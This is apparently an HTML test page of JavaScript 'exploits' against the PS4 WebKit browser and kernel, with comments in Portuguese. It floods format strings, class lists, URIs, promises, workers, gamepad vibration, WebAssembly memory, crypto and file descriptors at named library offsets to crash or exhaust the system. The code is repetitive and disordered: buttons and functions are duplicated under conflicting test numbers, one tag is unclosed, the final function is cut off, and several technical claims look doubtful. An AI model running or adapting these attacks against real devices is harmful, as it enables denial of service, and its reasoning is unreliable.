<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Binary Suite</title>    
</head>
<body>

    <h1>TARGETED BINARY EXPLOITS</h1>

    <div class="section">
        <h2>WEBKIT (USERLAND)</h2>
        <button onclick="runConsoleSprintf()">TEST 1: Console sprintf_s Buffer Overflow</button>
        <button onclick="runClassListStrcat()">TEST 2: DOMTokenList strcat Overflow</button>
        <button onclick="runPromiseDoubleResolve()">TEST 3: Promise 'Already Satisfied' Race</button>
        <button onclick="runSprintfAttack()">TEST 1: sprintf_s Precision Overflow (Libc 0xD82B0)</button>
        <button onclick="runStrcatURI()">TEST 2: URI strcat_s Buffer Too Small (Libc 0xD831C)</button>
        <button onclick="runPromiseRace()">TEST 3: Promise 'Already Satisfied' Race (Libc 0xEDD38)</button
        <button onclick="runSprintfAttack()">TEST 1: sprintf_s Precision Overflow (Libc 0xD82B0)</button>
        <button onclick="runOpStrcatCrash()">TEST 2: JSC op_strcat Side-Effect Crash (WebKit 0x2BA18D7)</button>
        <button onclick="runFutureRace()">TEST 3: Future 'Already Retrieved' Race (Libc 0xEDD1F)</button>
        <button onclick="runFutureLock()">TEST 1: Future 'Resource Error' Race (Libc 0xED3AA)</button>
        <button onclick="runGetsAttack()">TEST 2: gets_s Short Buffer Overflow (Libc 0xD80EC)</button>
        <button onclick="runStrcatBadDest()">TEST 3: strcat_s Bad Destination (Libc 0xD82E2)</button>
        <button onclick="runFutureLock()">TEST 1: Future 'Resource Error' Race (Libc 0xED3AA)</button>
        <button onclick="runGetsAttack()">TEST 2: gets_s Short Buffer Overflow (Libc 0xD80EC)</button>
        <button onclick="runStrcatBadDest()">TEST 3: strcat_s Bad Destination (Libc 0xD82E2)</button>
        <button onclick="runTLSStackSmash()">TEST 1: TLS 'alloca' Stack Clash (Libkernel 0x3E9E7)</button>
        <button onclick="runProfileOverflow()">TEST 2: CodeBlock Profile Allocation Overflow (WebKit 0x2BB268E)</button>
        <button onclick="runSocketRace()">TEST 3: Socket 'Already Connected' Race (Libc 0xEE000)</button>
        <button onclick="runProfileFlood()">TEST 1: CodeBlock Profile Alloc Overflow (WebKit 0x2BB268E)</button>
        <button onclick="runRopeFlatten()">TEST 2: JSC Rope String Flatten Crash (WebKit op_strcat)</button>
        <button onclick="runZeroBuffer()">TEST 3: gets_s Zero Buffer Trigger (Libc 0xD80BE)</button>
        <button onclick="runBadFormat()">TEST 1: sprintf_s Bad Format Argument (Recursive toString)</button>
        <button onclick="runStrcatSmall()">TEST 2: strcat_s Buffer Too Small (History API)</button>
        <button onclick="runMomentumRace()">TEST 3: Momentum Event Logic Race (Scroll)</button>
        <button onclick="runBadFormat()">TEST 1: sprintf_s Bad Format Argument (Recursive toString)</button>
        <button onclick="runStrcatSmall()">TEST 2: strcat_s Buffer Too Small (History API)</button>
        <button onclick="runMomentumRace()">TEST 3: Momentum Event Logic Race (Scroll)</button>
        <button onclick="runAllocSlow()">TEST 1: JSC::CompleteSubspace::allocateSlow (Heap Feng Shui)</button>
        <button onclick="runConsoleInject()">TEST 2: System Console Injection (Log page messages)</button>
        <button onclick="runAutoThread()">TEST 3: WTF::AutomaticThread Exhaustion</button>
        <button onclick="runMomentumCrash()">TEST 1: Momentum Scroll Event Logic Error (WebKit 0x2B1A943)</button>
        <button onclick="runFatalAlloc()">TEST 2: 'FATAL: attempt' Allocator Trigger (WebKit 0x2BB747E)</button>
        <button onclick="runVisibilitySuspend()">TEST 3: System Suspend Logic Stress (Kernel 0x76F68F)</button>
        <button onclick="runSharedProxyRace()">TEST 1: SharedWorkerThreadProxy C++ Race (WebKit 0x2E1615A)</button>
        <button onclick="runSysTmpFlood()">TEST 2: /system_tmp/ Overflow Trigger (Libkernel 0x3B32C)</button>
        <button onclick="runAutoThreadStress()">TEST 3: WTF::AutomaticThread Starvation (WebKit 0x2E16800)</button>
    </div>

    <div class="section">
        <h2>KERNEL (SYSTEM)</h2>
        <button class="kernel" onclick="runHIDOverwrite()">TEST 4: HID Driver Over-Write Pos (VR/Gamepad)</button>
        <button class="kernel" onclick="runMlockExhaustion()">TEST 5: VM Budget mlock Exhaustion</button>
        <button class="kernel" onclick="runPthreadInternal()">TEST 6: Pthread Internal Memory Error Trigger</button>
        <button class="kernel" onclick="runHIDFlood()">TEST 4: HMD/HID Over-Write Pos (Kernel 0xB27FA3)</button>
        <button class="kernel" onclick="runMlockExhaust()">TEST 5: vm.budgets.mlock Exhaustion (Libkernel 0x3B4A2)</button>
        <button class="kernel" onclick="runPthreadCrash()">TEST 6: Pthread Internal Memory Error (Libkernel 0x40076)</button>
        <button class="kernel" onclick="runHIDFlood()">TEST 4: HMD/HID Over-Write Pos (Kernel 0xB27FA3)</button>
        <button class="kernel" onclick="runMlockExhaust()">TEST 5: vm.budgets.mlock Exhaustion (Libkernel 0x3B4A2)</button>
        <button class="kernel" onclick="runPthreadCrash()">TEST 6: Pthread Internal Memory Error (Libkernel 0x40076)</button>
        <button class="kernel" onclick="runCryptoLock()">TEST 4: OpenSSL Rand Mutex Deadlock (Kernel 0xB3480E)</button>
        <button class="kernel" onclick="runTLSCrash()">TEST 5: scePthreadSetspecific Memory Error (Libkernel 0x41B09)</button>
        <button class="kernel" onclick="runFDSlam()">TEST 6: 'Too Many Files' FD Exhaustion (Libc 0xEE48A)</button>
        <button class="kernel" onclick="runCryptoLock()">TEST 4: OpenSSL Rand Mutex Deadlock (Kernel 0xB3480E)</button>
        <button class="kernel" onclick="runTLSCrash()">TEST 5: scePthreadSetspecific Memory Error (Libkernel 0x41B09)</button>
        <button class="kernel" onclick="runFDSlam()">TEST 6: 'Too Many Files' FD Exhaustion (Libc 0xEE48A)</button>
        <button class="kernel" onclick="runRedZoneFail()">TEST 4: Thread Red Zone Allocation Failure (Libkernel 0x3FFC2)</button>
        <button class="kernel" onclick="runKernelLeak()">TEST 5: Kernel Memory Leak Trigger (Kernel 0x770668)</button>
        <button class="kernel" onclick="runAllocFail()">TEST 6: 'Could not allocate' Stress (Kernel 0x76FD06)</button>
        <button class="kernel" onclick="runCryptoDeadlock()">TEST 4: OpenSSL Mutex Unlock Deadlock (Kernel 0xB34879)</button>
        <button class="kernel" onclick="runTLSBlock()">TEST 5: TLS Block Allocation Exhaustion (Libkernel 0x3E9E7)</button>
        <button class="kernel" onclick="runStackRedZone()">TEST 6: Stack Red Zone Bypass (Libkernel 0x3FFC2)</button>
        <button class="kernel" onclick="runTLSLeak()">TEST 4: Thread Leftover Data Leak (Libkernel 0x41B35)</button>
        <button class="kernel" onclick="runHMDState()">TEST 5: HMD 'Already Connected' Race (Kernel 0xB27CE9)</button>
        <button class="kernel" onclick="runHugeAlloc()">TEST 6: Kernel Large Alloc Fail (Kernel 0x76FD06)</button>
        <button class="kernel" onclick="runTLSLeak()">TEST 4: Thread Leftover Data Leak (Libkernel 0x41B35)</button>
        <button class="kernel" onclick="runHMDState()">TEST 5: HMD 'Already Connected' Race (Kernel 0xB27CE9)</button>
        <button class="kernel" onclick="runHugeAlloc()">TEST 6: Kernel Large Alloc Fail (Kernel 0x76FD06)</button>
        <button class="kernel" onclick="runPthreadAbort()">TEST 4: [ScePthread] abort() Trigger (Stack+Atomic)</button>
        <button class="kernel" onclick="runConsoleOpenFail()">TEST 5: Can't open console (Resource Starvation)</button>
        <button class="kernel" onclick="runStatsRace()">TEST 6: Kernel Heap Stats Update Race</button>
        <button class="kernel" onclick="runBadFree()">TEST 4: Invalid Free Trigger (Kernel 0x7705D9)</button>
        <button class="kernel" onclick="runHMDDetach()">TEST 5: HMD 'Already Detached' Race (Kernel 0xB28BFE)</button>
        <button class="kernel" onclick="runTLSDealloc()">TEST 6: TLS Deallocation Race (Libkernel 0x3E9B1)</button>
        <button class="kernel" onclick="runInterruptStorm()">TEST 4: int_thread_get Interrupt Storm (Kernel 0xB34DA3)</button>
        <button class="kernel" onclick="runMlockUnderflow()">TEST 5: vm.budgets.mlock_avail Underflow (Libkernel 0x3B48B)</button>
        <button class="kernel" onclick="runInitThreadFail()">TEST 6: thr_init.c Allocation Failure (Libkernel 0x3FE9C)</button>
    </div>

    <div id="log"></div>
    <div id="dummy"></div>

    <script>
        function log(msg) { 
            const el = document.getElementById('log');
            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // --- TESTE 1: Console sprintf_s Buffer Overflow ---
        // Alvo: "sprintf_s: buffer overflow" (LibcInternal)
        function runConsoleSprintf() {
            log("[WebKit] Atacando sprintf_s via Console...");
            
            // Cria uma string de formato e argumentos gigantes
            // O console.log usa formatação interna (ex: %s, %d) que chama sprintf
            const hugeString = "A".repeat(100 * 1024); // 100KB
            const format = "%s".repeat(1000); // 1000 substituições
            
            try {
                log("Enviando payload formatado...");
                // Passa 1000 argumentos gigantes para forçar overflow no buffer de formatação
                const args = new Array(1000).fill(hugeString);
                console.log(format, ...args);
                
                log("Console sobreviveu (Buffer truncado?).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: DOMTokenList strcat Overflow ---
        // Alvo: "strcat" (WebKit)
        function runClassListStrcat() {
            log("[WebKit] Atacando strcat via ClassList...");
            const el = document.getElementById('dummy');
            
            try {
                // DOMTokenList armazena classes como uma string única internamente separada por espaços
                // Adicionar classes força concatenação (strcat)
                const hugeClass = "cls_" + "X".repeat(50000);
                
                log("Concatenando 2000 classes gigantes...");
                
                // Adiciona massivamente para forçar realocação e concatenação
                for(let i=0; i<2000; i++) {
                    el.classList.add(hugeClass + i);
                }
                
                // Força serialização (leitura da string completa)
                const len = el.className.length;
                log(`ClassList length: ${len} (Seguro).`);
                
                el.className = ""; // Limpa
            } catch(e) {
                log("Erro ClassList: " + e.message);
            }
        }

        // --- TESTE 3: Promise 'Already Satisfied' Race ---
        // Alvo: "promise already satisfied" (LibcInternal)
        function runPromiseDoubleResolve() {
            log("[WebKit] Iniciando Promise Race...");
            
            const workerCode = `
                onmessage = () => {
                    // Tenta resolver e rejeitar a mesma promessa simultaneamente
                    // em loop apertado para atingir a condição de corrida C++
                    for(let i=0; i<10000; i++) {
                        new Promise((resolve, reject) => {
                            // Race condition nativa
                            resolve(1);
                            reject(2);
                        }).catch(()=>{});
                    }
                    postMessage("Done");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança múltiplos workers para aumentar a contenção no scheduler de Promises
            for(let i=0; i<10; i++) {
                new Worker(url).postMessage("go");
            }
            log("Promise race em andamento...");
        }

        // --- TESTE 4: HID Driver Over-Write Pos (Kernel) ---
        // Alvo: "hmd_cr:over write pos %d" (Kernel)
        function runHIDOverwrite() {
            log("[KERNEL] Atacando HID Driver (HMD/Gamepad)...");
            
            // Tenta usar a API de Gamepad para enviar dados de vibração (escrita no driver)
            // Se o driver HMD compartilha código com o HID genérico, isso pode atingir o alvo.
            window.addEventListener("gamepadconnected", (e) => {
                log(`Gamepad ${e.gamepad.index} conectado. Iniciando Flood...`);
                
                const gp = e.gamepad;
                if (gp.vibrationActuator) {
                    setInterval(() => {
                        // Envia comandos de efeito rápido e sobrepostos
                        // Tenta estourar o buffer de comandos do driver
                        gp.vibrationActuator.playEffect("dual-rumble", {
                            startDelay: 0,
                            duration: 1000,
                            weakMagnitude: 1.0,
                            strongMagnitude: 1.0
                        });
                        // Cancela imediatamente (Reset) e reenvia
                        gp.vibrationActuator.reset();
                    }, 1); // 1ms flood
                }
            });
            
            // Se não houver gamepad, tenta simular carga VR (se API existir)
            if (navigator.getVRDisplays) {
                navigator.getVRDisplays().then(displays => {
                    log("VR Displays query feita.");
                });
            }
            
            log("Aguardando interação do driver HID...");
            log("Pressione um botão no controle se nada acontecer.");
        }

        // --- TESTE 5: VM Budget mlock Exhaustion (Kernel) ---
        // Alvo: "vm.budgets.mlock_total" (Libkernel)
        function runMlockExhaustion() {
            log("[KERNEL] Esgotando mlock Budget...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const memories = [];
            
            // Tenta alocar o máximo de memória Wasm possível.
            // Memória Wasm é frequentemente "pinned" (mlocked) para performance ou segurança JIT.
            const interval = setInterval(() => {
                try {
                    // Aloca 16MB (256 pages)
                    const mem = new WebAssembly.Memory({initial: 256});
                    memories.push(mem);
                    
                    if (memories.length % 10 === 0) log(`Memórias alocadas: ${memories.length} (aprox ${memories.length * 16} MB)`);
                } catch(e) {
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Tente interagir com o sistema agora (Menu PS).");
                }
            }, 100);
        }

        // --- TESTE 6: Pthread Internal Memory Error (Kernel) ---
        // Alvo: "Pthread Internal Memory Error" (Offset 0x40076)
        function runPthreadInternal() {
            log("[KERNEL] Triggering Pthread Internal Error...");
            
            // Worker que cria e destroi SABs e usa Atomics
            // O objetivo é corromper a estrutura interna da thread no Kernel
            const workerCode = `
                onmessage = (e) => {
                    const sab = new SharedArrayBuffer(1024);
                    const view = new Int32Array(sab);
                    
                    // Espera fantasma
                    Atomics.wait(view, 0, 0, 1);
                    
                    // Suicídio rápido
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            // Criação/Destruição de threads em velocidade máxima
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) {
                    const w = new Worker(url);
                    w.postMessage("die");
                    // Não terminamos explicitamente, deixamos o 'close()' interno e o GC agirem
                    // Isso força o Kernel a limpar a thread naturalmente (ou falhar)
                }
                count += 10;
                if (count % 1000 === 0) log(`Threads recicladas: ${count}`);
                
                if (count > 20000) {
                    clearInterval(interval);
                    log("Pthread stress finalizado.");
                }
            }, 10);
        }
// --- TESTE 1: sprintf_s Precision Overflow ---
        // Alvo: Libc Offset 0xD82B0 ("sprintf_s: buffer overflow")
        function runSprintfAttack() {
            log("[WebKit] Atacando sprintf_s com precisão...");
            
            try {
                // Tenta usar o especificador de precisão (%.Ns) para forçar
                // o sprintf a alocar padding interno gigantesco.
                // Se a implementação não verificar o tamanho do padding + string...
                const val = 1.2345;
                
                log("Enviando console.log com precisão 1.000.000...");
                
                // Formatação: %f com precisão absurda
                // O WebKit passa isso para snprintf/sprintf_s da libc
                console.log("Attack: %1000000.1000000f", val);
                
                log("Console sobreviveu.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: URI strcat_s Buffer Too Small ---
        // Alvo: Libc Offset 0xD831C ("strcat_s: buffer too small")
        function runStrcatURI() {
            log("[WebKit] Atacando strcat_s em URI...");
            
            // decodeURIComponent usa buffers internos para reconstruir a string
            // Vamos criar uma string que expande drasticamente
            const part = "%25".repeat(10000); // 3 chars viram 1 (Decresce)
            // Mas se usarmos codificação inválida que força cópia sem conversão?
            
            // Tenta estourar o buffer de destino com URI malformada gigante
            const huge = "A".repeat(50000) + "%E0%A4%A"; // Sequência incompleta no fim
            
            try {
                log("Decodificando URI malformada gigante...");
                decodeURIComponent(huge);
                log("Decode OK.");
            } catch(e) {
                log("URIError (Seguro): " + e.message);
            }
        }

        // --- TESTE 3: Promise 'Already Satisfied' Race ---
        // Alvo: Libc Offset 0xEDD38 ("promise already satisfied")
        function runPromiseRace() {
            log("[WebKit] Forçando Promise Race Condition...");
            
            const workerCode = `
                onmessage = () => {
                    // Loop infinito de criação de promises com resolução concorrente
                    for(let i=0; i<5000; i++) {
                        let r, j;
                        const p = new Promise((res, rej) => { r = res; j = rej; });
                        
                        // Tenta resolver e rejeitar ao mesmo tempo em microtasks
                        // A libc reclama de "already satisfied" se a flag de estado não for atómica
                        queueMicrotask(() => r(1));
                        queueMicrotask(() => j(2));
                    }
                    postMessage("Done");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<10; i++) {
                new Worker(url).postMessage("go");
            }
            log("10 Workers a disputar estados de Promise.");
        }

        // --- TESTE 4: HMD/HID Over-Write Pos ---
        // Alvo: Kernel Offset 0xB27FA3 ("hmd_cr:over write pos %d")
        // Este erro indica overflow num ring buffer de comandos HID/VR.
        function runHIDFlood() {
            log("[KERNEL] Inundando Driver HID/HMD...");
            
            window.addEventListener("gamepadconnected", (e) => {
                const gp = e.gamepad;
                log("Gamepad encontrado. Iniciando Flood de Vibração...");
                
                // O driver tem um buffer de comandos.
                // Enviar comandos mais rápido do que o hardware processa causa "overwrite pos"
                setInterval(() => {
                    if (gp.vibrationActuator) {
                        // Comandos complexos variados para encher o buffer
                        gp.vibrationActuator.playEffect("dual-rumble", {
                            duration: Math.random() * 100,
                            strongMagnitude: Math.random(),
                            weakMagnitude: Math.random()
                        });
                        // Reset imediato (outra escrita no registro)
                        gp.vibrationActuator.reset();
                    }
                }, 0); // Oms = Máxima velocidade
            });
            
            log("Pressione um botão no controle para ativar o driver.");
        }

        // --- TESTE 5: vm.budgets.mlock Exhaustion ---
        // Alvo: Libkernel Offset 0x3B4A2 ("vm.budgets.mlock_total")
        function runMlockExhaust() {
            log("[KERNEL] Esgotando memória mlock (Wired)...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const allocs = [];
            // Páginas de 64KB
            // O sistema tem um limite rígido de memória 'wired' (não swap)
            // Wasm SharedMemory usa mlock
            const interval = setInterval(() => {
                try {
                    // Tenta alocar 64MB por vez
                    const mem = new WebAssembly.Memory({initial: 1000, shared: true});
                    allocs.push(mem);
                    
                    // Acessa para forçar page fault e bloqueio real na RAM
                    new Int32Array(mem.buffer)[0] = 1;
                    
                    log(`Alocados: ${allocs.length * 64} MB (Wired)`);
                } catch(e) {
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Tente abrir o menu rápido agora (Pode estar travado).");
                }
            }, 100);
        }

        // --- TESTE 6: Pthread Internal Memory Error ---
        // Alvo: Libkernel Offset 0x40076 ("Pthread Internal Memory Error")
        // Ocorre quando a estrutura interna da thread corrompe.
        function runPthreadCrash() {
            log("[KERNEL] Disparando Erro Interno Pthread...");
            
            if (!window.SharedArrayBuffer) return log("SAB off.");
            
            const sab = new SharedArrayBuffer(1024);
            const view = new Int32Array(sab);
            
            const workerCode = `
                onmessage = (e) => {
                    const view = new Int32Array(e.data);
                    // Entra em espera atómica
                    Atomics.wait(view, 0, 0, 100);
                    // Sai e morre imediatamente
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // O erro interno geralmente ocorre na destruição rápida de threads
            // que ainda têm recursos de sincronização pendentes
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) {
                    const w = new Worker(url);
                    w.postMessage(sab);
                    // Termina antes que o Atomics.wait termine naturalmente
                    w.terminate(); 
                }
                count += 20;
                if (count % 200 === 0) log(`Threads mortas: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Teste Pthread finalizado.");
                }
            }, 50);
        }
// --- TESTE 1: sprintf_s Precision Overflow ---
        // Alvo: Libc Offset 0xD82B0 ("sprintf_s: buffer overflow")
        function runSprintfAttack() {
            log("[WebKit] Atacando sprintf_s com precisão...");
            
            try {
                // Tenta usar o especificador de precisão (%.Ns) para forçar
                // o sprintf a alocar padding interno gigantesco.
                // Se a implementação não verificar o tamanho do padding + string...
                const val = 1.2345;
                
                log("Enviando console.log com precisão 1.000.000...");
                
                // Formatação: %f com precisão absurda
                // O WebKit passa isso para snprintf/sprintf_s da libc
                console.log("Attack: %1000000.1000000f", val);
                
                log("Console sobreviveu.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: JSC op_strcat Side-Effect Crash ---
        // Alvo: WebKit Offset 0x2BA18D7 ("**strcat", "op_strcat")
        // O JSC usa op_strcat para o operador '+'.
        function runOpStrcatCrash() {
            log("[WebKit] Atacando op_strcat com Side-Effects...");
            
            let evil = {
                toString: function() {
                    // Esvazia a memória ou altera o estado durante a concatenação
                    log("Side-effect durante strcat! Alocando lixo...");
                    // Tenta forçar GC ou realocação
                    let junk = new Array(10000).fill(1.1);
                    return "EVIL";
                }
            };

            try {
                // Cria muitas strings para forçar o motor a criar uma RopeString complexa
                let a = "A".repeat(1000);
                let b = "B".repeat(1000);
                
                log("Executando concatenação hostil...");
                // A ordem importa: (String + Object) chama toString() do Object
                // O motor já pode ter alocado buffer para 'a' e 'b', mas 'evil' muda o estado
                let res = a + b + evil + a + b;
                
                log("Concatenação OK (Seguro).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Future 'Already Retrieved' Race ---
        // Alvo: Libc Offset 0xEDD1F ("future already retrieved")
        // Sugere uso de std::future/promise C++ onde o estado é corrompido.
        function runFutureRace() {
            log("[WebKit] Forçando Future Race Condition...");
            
            // Usamos MessageChannel para simular promessas cross-thread que usam a infra do Kernel
            const ch = new MessageChannel();
            const sab = new SharedArrayBuffer(4);
            const view = new Int32Array(sab);
            
            const workerCode = `
                onmessage = (e) => {
                    const view = new Int32Array(e.data);
                    // Tenta "recuperar o futuro" (wait) massivamente
                    for(let i=0; i<1000; i++) {
                        Atomics.wait(view, 0, 0, 1); // Timeout curto
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança workers competindo pelo mesmo endereço de memória (Future)
            for(let i=0; i<4; i++) {
                new Worker(url).postMessage(sab);
            }
            
            // Na thread principal, acorda (satisfaz a promessa) e dorme rapidamente
            let interval = setInterval(() => {
                Atomics.notify(view, 0, 1);
                // Tenta criar confusão de estado
                Atomics.store(view, 0, (Math.random() * 100)|0);
            }, 0);
            
            setTimeout(() => { clearInterval(interval); log("Race finalizada."); }, 3000);
        }

        // --- TESTE 4: HMD/HID Over-Write Pos ---
        // Alvo: Kernel Offset 0xB27FA3 ("hmd_cr:over write pos %d")
        // Indica estouro de buffer circular no driver VR/HID.
        function runHIDFlood() {
            log("[KERNEL] Inundando Driver HID/HMD...");
            
            // Tenta ativar o driver VR mesmo sem headset
            if (navigator.getVRDisplays) {
                navigator.getVRDisplays().then(displays => {
                    log(`VR Displays: ${displays.length}. Atacando driver...`);
                    // O simples fato de chamar isso carrega o módulo HMD no kernel
                });
            }

            // Ouve gamepads (que partilham o subsistema HID)
            window.addEventListener("gamepadconnected", (e) => {
                const gp = e.gamepad;
                log(`Gamepad ${gp.index} conectado. Iniciando Flood...`);
                
                // Enviar comandos mais rápido do que o hardware processa causa "overwrite pos"
                setInterval(() => {
                    if (gp.vibrationActuator) {
                        // Comandos complexos para encher o buffer de comandos
                        gp.vibrationActuator.playEffect("dual-rumble", {
                            duration: 2000,
                            strongMagnitude: 1.0,
                            weakMagnitude: 1.0
                        });
                        // Reset imediato (tenta sobrescrever a posição de leitura do driver)
                        gp.vibrationActuator.reset();
                    }
                }, 1); // 1ms = velocidade máxima
            });
            
            log("Pressione um botão no controle para injetar comandos HID.");
        }

        // --- TESTE 5: vm.budgets.mlock Exhaustion ---
        // Alvo: Libkernel Offset 0x3B4A2 ("vm.budgets.mlock_total")
        function runMlockExhaust() {
            log("[KERNEL] Esgotando memória mlock (Wired)...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const allocs = [];
            // O sistema tem um limite rígido de memória 'wired'
            // Tenta alocar o máximo possível
            const interval = setInterval(() => {
                try {
                    // Aloca 32MB por vez (SharedMemory usa mlock em muitas implementações)
                    const mem = new WebAssembly.Memory({initial: 500, shared: true});
                    allocs.push(mem);
                    
                    // Acessa para forçar page fault e bloqueio real na RAM
                    new Int32Array(mem.buffer)[0] = 1;
                    
                    log(`Alocados: ~${allocs.length * 32} MB (Wired)`);
                } catch(e) {
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Sistema deve estar instável (Swap bloqueado).");
                }
            }, 50);
        }

        // --- TESTE 6: Pthread Internal Memory Error ---
        // Alvo: Libkernel Offset 0x40076 ("Pthread Internal Memory Error")
        // Este erro ocorre em 'thr_list.c', sugerindo corrupção da lista de threads.
        function runPthreadCrash() {
            log("[KERNEL] Disparando Erro Interno Pthread...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Define dados específicos da thread (TLS)
                    // Tenta alocar memória interna na estrutura da thread
                    try {
                        const local = new Float64Array(1000); 
                        local.fill(Math.random());
                        throw "ForceUnwind"; // Força limpeza de stack/TLS
                    } catch(x) {}
                    
                    close(); // Suicídio
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Criação e destruição massiva de threads
            // O objetivo é corromper a lista ligada de threads ativas no Kernel
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<50; i++) {
                    const w = new Worker(url);
                    w.postMessage("die");
                    // Não terminamos com w.terminate() aqui para deixar o worker chamar close()
                    // e passar pelo caminho de saída normal do pthread (thr_exit)
                }
                count += 50;
                if (count % 500 === 0) log(`Threads recicladas: ${count}`);
                
                if (count > 10000) {
                    clearInterval(interval);
                    log("Pthread stress finalizado.");
                }
            }, 20);
        }
// --- TESTE 1: Future 'Resource Error' Race ---
        // Alvo: Libc Offset 0xED3AA ("thread resource error")
        // Ocorre quando std::thread ou std::future falham ao alocar recursos.
        function runFutureLock() {
            log("[WebKit] Esgotando recursos de Thread/Future...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Cria muitas Promises (que usam microtasks e recursos de async)
                    // Tenta forçar erro de recurso na criação de threads implícitas
                    const p = [];
                    for(let i=0; i<5000; i++) {
                        p.push(Promise.resolve(i).then(v => v*2));
                    }
                    Promise.all(p).then(() => postMessage("OK"));
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança o máximo de workers possível para consumir recursos de thread
            // O PS4 tem um limite baixo de threads por processo web.
            for(let i=0; i<30; i++) {
                try { new Worker(url).postMessage("go"); } catch(e) { log("Limite Workers atingido: " + e); break; }
            }
            log("Stress de Futures iniciado.");
        }

        // --- TESTE 2: gets_s Short Buffer Overflow ---
        // Alvo: Libc Offset 0xD80EC ("gets_s: short buffer")
        // gets_s é usado para ler input de usuário de forma segura, mas a string de erro sugere falha.
        function runGetsAttack() {
            log("[WebKit] Atacando gets_s via Prompt UI...");
            
            // Cria uma string gigante para injetar em qualquer campo de input
            const payload = "OVERFLOW_" + "A".repeat(8192); // 8KB
            
            try {
                // 'prompt' é uma das poucas funções síncronas que usa buffers de texto do sistema
                // Se o buffer interno for menor que o payload e a verificação falhar...
                log("Abrindo prompt... (Não digite nada, apenas feche se aparecer)");
                
                // Nota: O prompt bloqueia o JS, mas o estouro ocorre na preparação da janela
                const res = prompt("Injecting Payload...", payload);
                
                log("Prompt retornou (Seguro).");
            } catch(e) {
                log("Erro Prompt: " + e.message);
            }
        }

        // --- TESTE 3: strcat_s Bad Destination ---
        // Alvo: Libc Offset 0xD82E2 ("strcat_s: bad destination argument")
        function runStrcatBadDest() {
            log("[WebKit] Atacando strcat_s (Destination)...");
            
            // Tenta corromper a concatenação de strings na barra de título ou status
            const hugeTitle = "T".repeat(1024 * 100); // 100KB
            
            try {
                // Definir document.title força uma cópia para o processo da UI
                // Se o buffer de destino for inválido ou pequeno...
                document.title = hugeTitle;
                
                // Tenta também History API que concatena URLs
                history.replaceState(null, hugeTitle, "#" + hugeTitle);
                
                log("Strings enviadas ao sistema.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 4: OpenSSL Rand Mutex Deadlock ---
        // Alvo: Kernel Offset 0xB3480E ("openssl:stl_wrapper.c:_rand_mtx_lock()")
        // O log mostra que o OpenSSL usa um wrapper STL com mutex para números aleatórios.
        function runCryptoLock() {
            log("[KERNEL] Atacando OpenSSL Mutex...");
            
            if (!window.crypto) return log("Crypto off.");
            
            const workerCode = `
                onmessage = () => {
                    const buf = new Uint8Array(4096);
                    // Loop infinito de pedidos de entropia
                    // Martela o _rand_mtx_lock encontrado no log
                    while(true) {
                        crypto.getRandomValues(buf);
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 20 Workers competindo pelo MESMO mutex global do OpenSSL no Kernel
            for(let i=0; i<20; i++) new Worker(url).postMessage("start");
            
            log("20 Workers em contenção no OpenSSL.");
        }

        // --- TESTE 5: scePthreadSetspecific Memory Error ---
        // Alvo: Libkernel Offset 0x41B09 ("scePthreadSetspecific Internal Memory Error")
        // Isso refere-se ao TLS (Thread Local Storage).
        function runTLSCrash() {
            log("[KERNEL] Esgotando Thread Local Storage (TLS)...");
            
            // Intl (Internacionalização) usa TLS intensivamente para cache de locale
            const workerCode = `
                onmessage = () => {
                    try {
                        const formatters = [];
                        // Cria milhares de formatadores únicos
                        // Cada um pode alocar slots no TLS ou heap associado à thread
                        for(let i=0; i<5000; i++) {
                            // Locale complexo para forçar alocação
                            formatters.push(new Intl.DateTimeFormat('en-u-ca-buddhist-nu-thai', {timeZone: 'UTC'}));
                        }
                    } catch(e) {}
                    // Morre com recursos alocados
                    close(); 
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Ciclo rápido de criação/destruição de threads com carga de TLS
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) new Worker(url).postMessage("go");
                count += 10;
                if (count % 500 === 0) log(`Ciclos TLS: ${count}`);
                if (count > 10000) clearInterval(interval);
            }, 50);
        }

        // --- TESTE 6: 'Too Many Files' FD Exhaustion ---
        // Alvo: Libc Offset 0xEE48A ("too many files open")
        // Queremos atingir esse erro exato para provar a exaustão.
        function runFDSlam() {
            log("[KERNEL] Iniciando FD Grand Slam...");
            
            const resources = [];
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // 1. MessageChannel (2 FDs cada)
                    const mc = new MessageChannel();
                    resources.push(mc);
                    count += 2;
                    
                    // 2. Fetch (1 Socket FD) - Mantém conexão aberta
